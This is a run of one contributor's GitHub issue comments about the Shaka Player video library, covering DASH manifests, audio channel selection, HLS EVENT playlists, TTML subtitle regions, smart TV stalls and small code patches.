code and testing and I think that preferredAudioChannelCountis not working how i expected.\nI have the next mpd:\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<MPD\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xmlns=\"urn:mpeg:dash:schema:mpd:2011\"\n  xsi:schemaLocation=\"urn:mpeg:dash:schema:mpd:2011 http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd\"\n  type=\"static\"\n  mediaPresentationDuration=\"PT3M28.981333S\"\n  maxSegmentDuration=\"PT3S\"\n  minBufferTime=\"PT0S\"\n  profiles=\"urn:mpeg:dash:profile:isoff-live:2011\">\n  <Period\n    duration=\"PT3M28.981333S\">\n    <BaseURL>dash/</BaseURL>\n    <AdaptationSet\n      group=\"1\"\n      contentType=\"audio\"\n      lang=\"en\"\n      segmentAlignment=\"true\"\n      audioSamplingRate=\"48000\"\n      mimeType=\"audio/mp4\"\n      codecs=\"ac-3\">\n      <AudioChannelConfiguration\n        schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\"\n        value=\"6\">\n      </AudioChannelConfiguration>\n      <SegmentTemplate\n        timescale=\"48000\"\n        initialization=\"60f_Encompass1080p_5-1-$RepresentationID$-init.mp4\"\n        media=\"60f_Encompass1080p_5-1-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>\n          ...\n        </SegmentTimeline>\n      </SegmentTemplate>\n      <Representation\n        id=\"audio_eng_1=256000\"\n        bandwidth=\"256000\">\n      </Representation>\n    </AdaptationSet>\n    <AdaptationSet\n      group=\"1\"\n      contentType=\"audio\"\n      lang=\"en\"\n      segmentAlignment=\"true\"\n      audioSamplingRate=\"24000\"\n      mimeType=\"audio/mp4\"\n      codecs=\"mp4a.40.2\">\n      <AudioChannelConfiguration\n        schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\"\n        value=\"2\">\n      </AudioChannelConfiguration>\n      <SegmentTemplate\n        timescale=\"24000\"\n        initialization=\"60f_Encompass1080p_5-1-$RepresentationID$-init.mp4\"\n        media=\"60f_Encompass1080p_5-1-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>\n          ...\n        </SegmentTimeline>\n      </SegmentTemplate>\n      <Representation\n        id=\"audio_eng=94726\"\n        bandwidth=\"94726\">\n      </Representation>\n    </AdaptationSet>\n    <AdaptationSet\n      id=\"3\"\n      group=\"2\"\n      contentType=\"video\"\n      lang=\"en\"\n      par=\"200:113\"\n      minBandwidth=\"111000\"\n      maxBandwidth=\"6562000\"\n      minWidth=\"400\"\n      maxWidth=\"1920\"\n      minHeight=\"226\"\n      maxHeight=\"1080\"\n      segmentAlignment=\"true\"\n      frameRate=\"60000/1001\"\n      mimeType=\"video/mp4\"\n      startWithSAP=\"1\">\n      <SegmentTemplate\n        timescale=\"60000\"\n        initialization=\"60f_Encompass1080p_5-1-$RepresentationID$-init.mp4\"\n        media=\"60f_Encompass1080p_5-1-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>\n          <S t=\"0\" d=\"60060\" r=\"207\" />\n          <S d=\"40040\" />\n        </SegmentTimeline>\n      </SegmentTemplate>\n      <Representation\n        id=\"video_eng=111000\"\n        bandwidth=\"111000\"\n        width=\"400\"\n        height=\"226\"\n        codecs=\"avc1.42001F\"\n        scanType=\"progressive\">\n      </Representation>\n      <Representation\n        id=\"video_eng=438000\"\n        bandwidth=\"438000\"\n        width=\"400\"\n        height=\"226\"\n        sar=\"226:225\"\n        codecs=\"avc1.42001F\"\n        scanType=\"progressive\">\n      </Representation>\n      <Representation\n        id=\"video_eng=1211000\"\n        bandwidth=\"1211000\"\n        width=\"640\"\n        height=\"360\"\n        codecs=\"avc1.4D001F\"\n        scanType=\"progressive\">\n      </Representation>\n      <Representation\n        id=\"video_eng=2114000\"\n        bandwidth=\"2114000\"\n        width=\"852\"\n        height=\"480\"\n        codecs=\"avc1.4D0029\"\n        scanType=\"progressive\">\n      </Representation>\n      <Representation\n        id=\"video_eng=6562000\"\n        bandwidth=\"6562000\"\n        width=\"1920\"\n        height=\"1080\"\n        codecs=\"avc1.64002A\"\n        scanType=\"progressive\">\n      </Representation>\n    </AdaptationSet>\n  </Period>\n</MPD>\nThe stream has 2 audios:\n- 6 channels with codec ac-3\n- 2 channels with codec mp4a.40.2\nTesting in Safari & Tizen TV (2017)\nIf I configure preferredAudioChannelCount = 6, I expect that the player choose 6 channels with codec ac-3, but the function shaka.Player.prototype.chooseCodecsAndFilterManifest_ does not have the preferredChannelCount preferred value into account, and the player choose the codec with less bandwidth and it doesn't respect preferredAudioChannelCount preference.\n. For me it's OK, if my preference is 6 channels, i don't have any problem if the user can not choose 2 channels.. @joeyparrish, I see the same error that in my previous comment https://github.com/google/shaka-player/issues/1013#issuecomment-381870393\nSelection of ac-3 in some cases (aac 2.0 & ac-3 5.1) is working perfectly. Now it works! thanks. Do you know when version 2.4 will come out?. Thanks @joeyparrish !. Sorry, I copy the mpd wrong. \nThe case it's the same as the EVENT playlist in HLS. It's used for sport events or live events (news, music, ...).\nBefore to event end:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n\n../../../../live/localdisk/Ateme_tcpreplay/AndyDASH/dash/\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n```\nJust to event end:\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<MPD\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xmlns=\"urn:mpeg:dash:schema:mpd:2011\"\n  xsi:schemaLocation=\"urn:mpeg:dash:schema:mpd:2011 http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd\"\n  type=\"static\"\n  mediaPresentationDuration=\"PT1M24.010645S\"\n  maxSegmentDuration=\"PT3S\"\n  minBufferTime=\"PT0S\"\n  profiles=\"urn:mpeg:dash:profile:isoff-live:2011,urn:com:dashif:dash264\">\n  <Period\n    duration=\"PT1M24.010645S\">\n    <BaseURL>../../../../live/localdisk/Ateme_tcpreplay/AndyDASH/dash/</BaseURL>\n    <AdaptationSet\n      group=\"1\"\n      contentType=\"audio\"\n      lang=\"fr\"\n      minBandwidth=\"96000\"\n      maxBandwidth=\"128000\"\n      segmentAlignment=\"true\"\n      audioSamplingRate=\"48000\"\n      mimeType=\"audio/mp4\"\n      codecs=\"mp4a.40.2\">\n      <AudioChannelConfiguration\n        schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\"\n        value=\"2\">\n      </AudioChannelConfiguration>\n      <SegmentTemplate\n        timescale=\"48000\"\n        presentationTimeOffset=\"4185620056320\"\n        initialization=\"Ateme_tcpreplay-$RepresentationID$-init.mp4\"\n        media=\"Ateme_tcpreplay-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>\n          <S t=\"4185620056320\" d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n        </SegmentTimeline>\n      </SegmentTemplate>\n      <Representation\n        id=\"audio_20003=96000.track_id=20003\"\n        bandwidth=\"96000\">\n      </Representation>\n      <Representation\n        id=\"audio_20000=128000.track_id=20000\"\n        bandwidth=\"128000\">\n      </Representation>\n    </AdaptationSet>\n    <AdaptationSet\n      group=\"1\"\n      contentType=\"audio\"\n      lang=\"qaa\"\n      minBandwidth=\"96000\"\n      maxBandwidth=\"128000\"\n      segmentAlignment=\"true\"\n      audioSamplingRate=\"48000\"\n      mimeType=\"audio/mp4\"\n      codecs=\"mp4a.40.2\">\n      <AudioChannelConfiguration\n        schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\"\n        value=\"2\">\n      </AudioChannelConfiguration>\n      <SegmentTemplate\n        timescale=\"48000\"\n        presentationTimeOffset=\"4185620056320\"\n        initialization=\"Ateme_tcpreplay-$RepresentationID$-init.mp4\"\n        media=\"Ateme_tcpreplay-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>\n          <S t=\"4185620056320\" d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n        </SegmentTimeline>\n      </SegmentTemplate>\n      <Representation\n        id=\"audio_20004=96000.track_id=20004\"\n        bandwidth=\"96000\">\n      </Representation>\n      <Representation\n        id=\"audio_20001=128000.track_id=20001\"\n        bandwidth=\"128000\">\n      </Representation>\n    </AdaptationSet>\n    <AdaptationSet\n      group=\"1\"\n      contentType=\"audio\"\n      lang=\"qad\"\n      minBandwidth=\"96000\"\n      maxBandwidth=\"128000\"\n      segmentAlignment=\"true\"\n      audioSamplingRate=\"48000\"\n      mimeType=\"audio/mp4\"\n      codecs=\"mp4a.40.2\">\n      <AudioChannelConfiguration\n        schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\"\n        value=\"2\">\n      </AudioChannelConfiguration>\n      <SegmentTemplate\n        timescale=\"48000\"\n        presentationTimeOffset=\"4185620056320\"\n        initialization=\"Ateme_tcpreplay-$RepresentationID$-init.mp4\"\n        media=\"Ateme_tcpreplay-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>\n          <S t=\"4185620056320\" d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n          <S d=\"96257\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96256\" />\n        </SegmentTimeline>\n      </SegmentTemplate>\n      <Representation\n        id=\"audio_20005=96000.track_id=20005\"\n        bandwidth=\"96000\">\n      </Representation>\n      <Representation\n        id=\"audio_20002=128000.track_id=20002\"\n        bandwidth=\"128000\">\n      </Representation>\n    </AdaptationSet>\n    <AdaptationSet\n      group=\"2\"\n      contentType=\"video\"\n      par=\"71:40\"\n      minBandwidth=\"91072\"\n      maxBandwidth=\"2882752\"\n      minWidth=\"426\"\n      maxWidth=\"1920\"\n      minHeight=\"240\"\n      maxHeight=\"1080\"\n      segmentAlignment=\"true\"\n      frameRate=\"25\"\n      mimeType=\"video/mp4\"\n      startWithSAP=\"1\">\n      <SegmentTemplate\n        timescale=\"25\"\n        presentationTimeOffset=\"2180010446\"\n        initialization=\"Ateme_tcpreplay-$RepresentationID$-init.mp4\"\n        media=\"Ateme_tcpreplay-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>\n          <S t=\"2180010446\" d=\"50\" r=\"41\" />\n        </SegmentTimeline>\n      </SegmentTemplate>\n      <Representation\n        id=\"video=91072.track_id=10000\"\n        bandwidth=\"91072\"\n        width=\"426\"\n        height=\"240\"\n        codecs=\"avc1.4D4015\"\n        scanType=\"progressive\">\n      </Representation>\n      <Representation\n        id=\"video=484608.track_id=10001\"\n        bandwidth=\"484608\"\n        width=\"640\"\n        height=\"360\"\n        codecs=\"avc1.4D401E\"\n        scanType=\"progressive\">\n      </Representation>\n      <Representation\n        id=\"video=2084096.track_id=10002\"\n        bandwidth=\"2084096\"\n        width=\"1280\"\n        height=\"720\"\n        codecs=\"avc1.4D401F\"\n        scanType=\"progressive\">\n      </Representation>\n      <Representation\n        id=\"video=2882752.track_id=10003\"\n        bandwidth=\"2882752\"\n        width=\"1920\"\n        height=\"1080\"\n        codecs=\"avc1.4D4028\"\n        scanType=\"progressive\">\n      </Representation>\n    </AdaptationSet>\n  </Period>\n</MPD>\nI cannot provide a manifest URI, due it's a local server, we are using Anevia packager.. I'll try to get a sharable url, but i need some days.. Hi @vaage , the stream to test is:\nhttps://cdn.demo.anevia.com/nPVR/eds/StarsTV/miradash/StarsTV.mpd?begin=1508156633&end=1508156700\nYou need change the begin and end parameters by the correct unix time (max 10 minutes between begin and end around the current hour). Could you clarify which do you mean by knowing the duration of the live stream?\nWe cannot change availabilityStartTime to 0 because it's impact on CDN hints. The same segment are used on live and for this feature.. After check our specs, we have the last case \"this case won't work for something like a TV channel which runs for days and then you only want to keep the last hour of the stream.\" We have a buffer of 8 hours, but the events duration is less than 8 hours.. @joeyparrish , I lost the track of this issue, but i see that has been deprioritized to backlog, why?\nNote: I see the same behaviour on HLS with EVENT playlist.. @joeyparrish, you can use: https://shaka-player-demo.appspot.com/demo/#asset=https://storage.googleapis.com/wvtemp/kylealexander/packager_test/iop_compliant_mpd_test/llama.mpd;license=https://proxy.uat.widevine.com/proxy?provider=widevine_test;lang=es;build=uncompiled\nManifest: https://storage.googleapis.com/wvtemp/kylealexander/packager_test/iop_compliant_mpd_test/llama.mpd\nWidevine server: https://proxy.uat.widevine.com/proxy?provider=widevine_test. @joeyparrish , sorry for late response (I lost the previous notification)\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n\ndash/\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n```\nWith the previous MPD (I don't have a shareable url) you can see that there are 2 audio AdaptationSets  with the same languages and properties, but diferentes AudioChannelConfiguration.\nAccording to According to DASH-IF-IOP v4.1, \"3.8 Switching across Adaptation Sets\", with the previous MPD, the player shouldn't provide adaption between the differentes AdaptationSets  due the missing descriptor urn:mpeg:dash:adaptation-set-switching:2016\n. Yes, I expect that the user can select 2 o 6 channels.. No problem, if the https://github.com/google/shaka-player/issues/1013 is in 2.4, I don't have any problem.. I'm reviewing and i think that I'll need new methods in the player:\ngetAudioLanguagesRolesAndChannels()\nselectAudioLanguage(language, opt_role, opt_channels)\nIs it possible add theses methods?. Yes, i'm waiting to a solution. Thanks for the information. Hi @joeyparrish,\nWith this patch should be enough?\n```\ndiff --git a/lib/hls/hls_parser.js b/lib/hls/hls_parser.js\nindex b684d280..602afa05 100644\n--- a/lib/hls/hls_parser.js\n+++ b/lib/hls/hls_parser.js\n@@ -1372,6 +1372,8 @@ shaka.hls.HlsParser.prototype.getStartTime_ =\n       // There is no standard way to embed a timestamp in an mp3 file, so the\n       // start time is presumably 0.\n       return 0;\n+    } else if (mimeType == 'audio/aac') {\n+      return 0\n     } else if (mimeType == 'video/mp2t') {\n       return this.getStartTimeFromTsSegment_(responses[0].data);\n     } else if (mimeType == 'application/mp4' ||\n@@ -1867,6 +1869,7 @@ shaka.hls.HlsParser.AUDIO_EXTENSIONS_TO_MIME_TYPES_ = {\n   'm4s': 'audio/mp4',\n   'm4i': 'audio/mp4',\n   'm4a': 'audio/mp4',\n+  'aac': 'audio/aac',\n   // mpeg2 ts aslo uses video/ for audio: http://goo.gl/tYHXiS\n   'ts': 'video/mp2t'\n };\n```. @joeyparrish I'm on vacation until Monday, I can not look at it now, I'm sorry. @joeyparrish , You can check with this stream: https://cdn.demo.anevia.com/live/eds/dvb_txt/HLS-MP4/dvb_txt.m3u8. \n. I see the same error with other dash streams and i think that is the same issue that https://github.com/google/shaka-player/issues/1104. @joeyparrish , I asked for our provider, and this feature will be implemented in a few weeks. I'm back to you when this is implemented. I think that it is the same as https://github.com/google/shaka-player/issues/1105. It's very strange, with other pages work (using native text track)\n\n. In Firefox & Opera work as expected in the same machine.. It is something related to my browser.. I reset all experiments in chrome://flags/, and now it works!. Hi @ismena , I tested your commit and I found it:\n\nStream: https://irtdashreference-i.akamaihd.net/dash/live/901161/bfs/manifestARD.mpd. @joeyparrish, for me it a unexpected result.\nThis is the ttml with the region:\n<tt xmlns=\"http://www.w3.org/ns/ttml\" xmlns:tt=\"http://www.w3.org/ns/ttml\" xmlns:ttm=\"http://www.w3.org/ns/ttml#metadata\" xmlns:tts=\"http://www.w3.org/ns/ttml#styling\" xmlns:ttp=\"http://www.w3.org/ns/ttml#parameter\" xmlns:ebutts=\"urn:ebu:tt:style\" xmlns:ebuttm=\"urn:ebu:tt:metadata\" xml:lang=\"\" ttp:timeBase=\"media\">\n  <head>\n    <metadata>\n      <ebuttm:documentMetadata>\n        <ebuttm:conformsToStandard>urn:ebu:tt:distribution:2014-01</ebuttm:conformsToStandard>\n      </ebuttm:documentMetadata>\n    </metadata>\n    <styling>\n      <style xml:id=\"Style0_27\" tts:fontFamily=\"proportionalSansSerif\" tts:backgroundColor=\"#00000099\" tts:color=\"#FFFFFF\" tts:fontSize=\"100%\" tts:lineHeight=\"normal\" ebutts:linePadding=\"0.5c\" />\n      <style xml:id=\"textAlignment_27\" tts:textAlign=\"center\" />\n    </styling>\n    <layout>\n      <region xml:id=\"Region\" tts:origin=\"10% 10%\" tts:extent=\"80% 80%\" tts:displayAlign=\"after\" />\n    </layout>\n  </head>\n  <body>\n    <div>\n      <p region=\"Region\" style=\"textAlignment_27\" begin=\"93:06:29.180\" end=\"93:06:30.140\" xml:id=\"sub_0\">\n        <span style=\"Style0_27\">Und der Kartoffelsalat</span>\n        <br />\n        <span style=\"Style0_27\">ganz fangfrisch.</span>\n      </p>\n    </div>\n  </body>\n</tt>\nI can reproduce it with https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://irtdashreference-i.akamaihd.net/dash/live/901161/bfs/manifestARD.mpd;lang=es-es;build=uncompiled and Chrome 64 in Ubuntu 17.04. tts:origin=\"10% 10%\" is working as expected\ntts:extent=\"80% 80%\" is working as expected with the width but the height is not 80% (see https://www.w3.org/TR/ttml1/#style-attribute-extent )\ntts:displayAlign=\"after\" is wrong (see https://www.w3.org/TR/ttml1/#style-attribute-displayAlign )\nWhy is the region black?\n. VTTRegion is enabled with chrome://flags/#enable-experimental-web-platform-features after investigate, I think that the issue with the background color is a Chrome issue. I tested with:\n`video::cue {\n  background: transparent;\n}\nvideo::cue-region {\n  background: transparent;\n}`\nand I doesn't work.. @vaage , I just tested and I see the same behaviour.. @vaage, I tested the same stream in Safari, AVPlayer (iOS), ExoPlayer (Android),  hls.js and in all it works. @joeyparrish , do you have any update? We want use fmp4 with HLS, but this issue is limiting us.. Thanks @joeyparrish . I just tested the fix for MP4 timescale and it works!. Can you migrate this fix to 2.3.x?. It's enough for now. Thanks!. I understand the problems, it is better not to implement it, you are right.. I cannot provide a sample content (is in our lab and it's not public)\nThe default codec detectd by ShakaPlayer is avc1.42E01E,mp4a.40.2. This is avc1.42E01E for video and mp4a.40.2 for audio.\nThe master playlist is\n```\nEXTM3U\nEXT-X-VERSION:4\nEXT-X-MEDIA:TYPE=AUDIO,GROUP-ID=\"audio\",NAME=\"unknown\",LANGUAGE=\"spa\",DEFAULT=YES,AUTOSELECT=YES,URI=\"a64000_spa/index.m3u8\"\nEXT-X-STREAM-INF:BANDWIDTH=5064000,AUDIO=\"audio\",CODECS=\"avc1.4d001f\"\nv5000000/index.m3u8\nEXT-X-STREAM-INF:BANDWIDTH=5564000,AUDIO=\"audio\",CODECS=\"avc1.4d001f\"\nv5500000/index.m3u8\n```\nIn the codecs attribute you can see CODECS=\"avc1.4d001f\". The video codec is avc1.4d001f. The audio codec is not defined.\nThe media playlist are TS segments.\nMy proposal is differenciate video codec by default and audio codec by default separately.\nIn the previous case, ShakaPlayer should use avc1.4d001f for video and mp4a.40.2 for audio.. I expect that works the same way that DASH.\nWe want offer to the user the same experiencie with DASH and HLS. We offer to the users a n-timeshift over live stream ( the same as Youtube, eg: https://www.youtube.com/watch?v=0tek2aa8hAQ)\nhttps://shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-live-assets/player-source.mpd;lang=es-419;build=uncompiled\nShaka Player Demo.zip\n. hi @theodab \nit's not working as expected, how can you knowWindow by default in HLS? with the new configuration I can only set a value if the value it's know by the application, but the real availabilityWindow is already included in the stream\nBy default the behavior it's the same as in previous releases (eg 2.4.2) and the default behavior is different to DASH.. Hi @joeyparrish,\nI just tested with Infinity and I get more range than declared in the playlist. This does not work for an EVENT playlist (startover funcionality) because the start is a known value, but the duration change in each update.\nI attach a video with the test.\nIssue-1307.zip. I found thaht it's not possible configure availabilityWindowOverride = Infinity in Demo page, is it possible add Infinity value? . I just tested and everything works as expected. Thanks!!. You can find more info in:\nhttps://devstreaming-cdn.apple.com/videos/wwdc/2017/504op4c3001w2f222/504/504_advances_in_http_live_streaming.pdf?dl=1\nThe use case of EXT-X-GAP in our case is skip some segment if the transponder is not enough powerful (in Live and Event playlist)\n. We are using ShakaPlayer with WebOS 3.5 and DASH+Widevine without any problem.. @chrisfillmore , What versions of WebOS have you tried? I only tried WebOS 3.5.. I'd prefer that Shaka Player supports WebOS 3.5 or above (WebOS 4 is scheduled for the end of year).\nThe only \"strange\" thing that i found in some WebOS TV is related to video resolution, eg:\nModel: lg-24MT49S-PZ (this is a low end model) with HD ready resolution (1366x768px) is not able to reproduce streams of 1080p, so I need configure setMaxHardwareResolution with 1366x768 . @chrisfillmore, our media segment only include one PSSH box. Something like https://github.com/videojs/m3u8-parser ?. I have transmitted the message to the provider, I am waiting for what they tell me.. Are there another type of redirection (301?, 307?, ...) that address our need?. Yes, HTTP redirect is for load-balancing (regional) and minor latency.\nI see the behaviour in DASH-IF, Theoplayer y ShakaPlayer\n\n\n\nDASH-IF and Theoplayer have the expected behavior. And only ShakaPlayer go to load-balancer in the manifest update.\nSo, should redirects for manifests be \"sticky\"? Yes. I see that the milestone is backlog. Can you add it to 2.5?. @joeyparrish, I saw that I you have open dev tools with \"Disable cache\" checked (in network tab) and \"Bypass for network\" (in Application tab --> Service Workers), It works correctly. Are you tested with these fields unchecked?. @vaage , i'm talking with our providers for provide a valid url again.. The previous url is working again.. With the commit https://github.com/google/shaka-player/commit/d6720cc7a69791333b4c6b60271ae4e279c10bf1 I see that Fetch is used for fallback, then the issue will appear again in v2.5. Sample of cea608 parser: https://github.com/Dash-Industry-Forum/dash.js/blob/development/externals/cea608-parser.js. @forbesjo, Do you have in mind to support multiple CC in the same MP4?. mux.js has released version 4.5.0 with support for CEA608 in mp4.. I see that the issue is on backlog. @joeyparrish , can you change it to 2.5?. @joeyparrish the configuration forceTransmuxTS (https://shaka-player-demo.appspot.com/docs/api/shakaExtern.html#.StreamingConfiguration) will be necessary after changes in  your HLS parser?. @TheModMaker , We will use this information for chaptering and thumbnails using this \"standard\" json https://developer.apple.com/documentation/avfoundation/media_assets_playback_and_editing/javascript_object_notation_json_chapter_format_for_http_live_streaming \nFire a event with all information(DATA-ID, VALUE, URI, LANGUAGE) is enough for me.. Yes, I expect the event when the master playlist is parsed. Another possibility is provide a method in the player for get this information.. More Info:\nhttps://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/A5Ux5CzpeWs/KjIcVDmpDAAJ\nhttps://rawgit.com/wicg/media-source/codec-switching/index.html. Added in webkit: https://bugs.webkit.org/show_bug.cgi?id=188626\nAdded in Firefox: https://bugzilla.mozilla.org/show_bug.cgi?id=1481166. Added in Safari Technology Preview release 64: https://developer.apple.com/safari/technology-preview/release-notes/. More info: https://developers.google.com/web/updates/2018/09/chrome-70-media-updates\nSample: https://googlechrome.github.io/samples/media/sourcebuffer-changetype.html. Is possible update the documentation to reflect it? I see that the player constructor has a video param which is HTMLMediaElement, is it possible change the video param to mediaElement param?. @joeyparrish , have you found something that may help find the problem?\n. @joeyparrish , can you share the commands (ffmepg and shaka-packager) used to generate https://storage.googleapis.com/shaka-live-assets/player-source.mpd ? We are investigating the issue with Edgeware and i think that it can help. Thanks!. Thanks @joeyparrish !. @joeyparrish , the stream posted previously (https://cdn.digital.com.bo/__cl/cg:default/__c/BOLIVIATV/__op/dash-default/__f/manifest.mpd) is from Edgeware (@TobbeEdgeware ) . The previous analysis indicate that the stream only works if AST less than 49.7 days, I think that it's not possible works with these value in a production environment. \nPlease, tell us if it is possible to carry out the solution proposed by Tobbe.\nNote: the same stream works in Opera, Chrome, Firefox, Safari, Edge and WebOS. . @chrisfillmore , you can use:\nhttps://livesim.dashif.org/livesim/testpic_2s/Manifest.mpd\nhttps://livesim.dashif.org/livesim/segtimeline_1/testpic_2s/Manifest.mpd\nhttps://livesim.dashif.org/livesim/segtimeline_1/utc_direct-head-ntp-sntp/testpic_2s/Manifest.mpd\nMy stream is geoblocked. @chrisfillmore \nTizen 3 (2017) UE40MU6105 - Firmware 1250.5\nTizen 4 (2018) UE43NU7405 - Firmware 1153.3. @chrisfillmore can you share your 2017/2018 models and firmwares?. I tested the button on Opera and it does not work.. @beaufortfrancois , There are not video when the user clicks on PiP button. The video is remplaced by splash with a text indicating thaht is in PiP but there are not external window with the video. \nNote: In Chrome works perfectly.. @beaufortfrancois , you can find the video attached.\n1682.zip\n. Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 OPR/57.0.3098.76 over Ubuntu 18.04. I have the default configuration,  I didn't modify any flag on opera://flags. @joeyparrish I have the same error:\n\nMy useragent is \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\" (Ubuntu 18.04)\n. I think that is not the same error. We can reproduce some seconds (30~40) and after the stall is produced without any intervention. The problem is not on the stream intialization.\n@joeyparrish  Tomorrow i'll try to get more logs and the values when the player enter in handleStall_ . Thanks.. I attach the logs from the TV:\n\nIn this case, the problem occurs after 5 seconds of load the video, with the first message of \"Flushing media pipeline due to stall inside buffered range\".\n\n. Hi @joeyparrish \n\"But you said that if the platform is excluded from these checks, playback doesn't stall at all? Or does it stall and then self-correct?\"\n- The playback doesn't stall at all. There are a video smooth.\nI attach a new image with the text selected when the stall is produced.\n\nI'll send you a private video with the current behaviour and the behaviour with my proposal.. I made the first test (comment out this.video_.currentTime += 0.1)\n\nLogs:\n\nFull logs on txt:\nfull-log-1.txt\nNo with the abr.enabled = false\n\nAPP configuration:\n\nLogs:\n\nFull logs on txt:\nfull-log-2.txt\nNote: there are the same error.. @joeyparrish, have you been able to review my previous results?. @Kogoruhn with 1500 for me it's not working.. I just tested with 3000 and it works 99% of the time. @joeyparrish I created a patch, I'll wait to make PR to next week in case someone from the thread has objections.\n```\ndiff --git a/AUTHORS b/AUTHORS\nindex 54101434..5c4e2bbc 100644\n--- a/AUTHORS\n+++ b/AUTHORS\n@@ -15,6 +15,7 @@\nAdsWizz *@adswizz.com\n Alugha GmbH *@alugha.com\n+Alvaro Velad Galvan alvaro.velad@mirada.tv\n 